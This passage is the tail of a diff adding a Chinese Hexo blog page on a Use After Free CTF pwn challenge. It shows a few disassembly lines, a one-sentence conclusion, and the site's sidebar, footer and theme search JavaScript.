&lt;__libc_start_main@plt+6&gt;:	push   0x48</span><br><span class="line">   0x804852b &lt;__libc_start_main@plt+11&gt;:	jmp    0x8048480</span><br><span class="line">   0x8048530 &lt;setvbuf@plt&gt;:	jmp    DWORD PTR ds:0x804a034</span><br></pre></td></tr></table></figure>
+<h1 id="0x03：总结"><a href="#0x03：总结" class="headerlink" title="0x03：总结"></a>0x03：总结</h1><p>Pwn中的堆确实是比赛中考察的一个重点，要多练习</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Use-After-Free/" rel="tag"><i class="fa fa-tag"></i> Use After Free</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/21/CVE-2014-4113/" rel="next" title="CVE-2014-4113">
+                <i class="fa fa-chevron-left"></i> CVE-2014-4113
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/07/Fastbin-Double-Free/" rel="prev" title="Fastbin Double Free">
+                Fastbin Double Free <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Thunder_J</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/ThunderJie" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/thunder-j/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-compass"></i>知乎</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://blog.csdn.net/CharlesGodX/" target="_blank" title="csdn"><i class="fa fa-fw fa-copyright"></i>csdn</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/ThunderJ17" target="_blank" title="Twitter"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00：前言"><span class="nav-number">1.</span> <span class="nav-text">0x00：前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01：漏洞介绍"><span class="nav-number">2.</span> <span class="nav-text">0x01：漏洞介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02：例子"><span class="nav-number">3.</span> <span class="nav-text">0x02：例子</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example-One"><span class="nav-number">3.1.</span> <span class="nav-text">Example One</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example-Two"><span class="nav-number">3.2.</span> <span class="nav-text">Example Two</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目链接"><span class="nav-number">3.2.1.</span> <span class="nav-text">题目链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解题思路"><span class="nav-number">3.2.2.</span> <span class="nav-text">解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#add-note"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">add_note</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#print-note"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">print_note</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#delete-note"><span class="nav-number">3.2.2.3.</span> <span class="nav-text">delete_note</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03：总结"><span class="nav-number">4.</span> <span class="nav-text">0x03：总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright"> &copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Thunder_J</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">328k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">4:58</span>
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.4.2</div>
+
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:
+  <span id="busuanzi_value_site_uv"></span>
+  人
+</span>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    总访问量
+    <span id="busuanzi_value_site_pv"></span>
+    次
+</span>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.4.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.4.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- ҳ����С���� -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
